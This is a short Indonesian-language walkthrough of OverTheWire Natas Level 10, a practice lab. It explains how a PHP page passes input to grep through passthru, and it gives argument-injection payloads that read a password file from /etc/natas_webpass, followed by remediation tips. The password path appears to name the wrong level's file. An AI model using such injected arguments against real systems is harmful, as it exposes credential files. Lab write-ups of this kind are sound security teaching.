---
title: "Level 10"
description: Melewati filter input dengan mengeksploitasi perilaku multi-file grep.
sidebarTitle: "Level 10 — Bypass Filter Input"
---

## Profil

- **Target:** `http://natas10.natas.labs.overthewire.org`
- **Kredensial:** `natas10` / (password dari Level 9)

## Pengintaian

Kode sumber mirip dengan Level 9, tetapi dengan filter input tambahan:

```php
if(preg_match('/[;|&]/', $key)) {
    print "Input contains an illegal character!";
} else {
    passthru("grep -i $key dictionary.txt");
}
```

Metakarakter shell diblokir.

## Analisis

Meskipun metakarakter shell difilter, perintah `grep` masih menerima input yang tidak tersanitasi. `grep` menerima pola dan satu atau lebih path file. Jika input berisi pola yang cocok dengan semua baris dan path file tambahan, `grep` akan mencari file tersebut.

## Eksploitasi

Payload:

```
.* /etc/natas_webpass/natas10 #
```

Menghasilkan perintah:

```bash
grep -i .* /etc/natas_webpass/natas10 # dictionary.txt
```

Pola `.*` cocok dengan semua baris. `grep` mencari kedua file, dan `#` mengomentari sisanya.

Payload alternatif:

- `"" /etc/natas_webpass/natas10 /`
- `.* /etc/natas_webpass/natas10`

## Remediasi

- Gunakan `escapeshellarg()` untuk memperlakukan input sebagai argumen tunggal
- Hindari fungsi eksekusi shell sepenuhnya
- Terapkan whitelist ketat untuk pola yang diizinkan
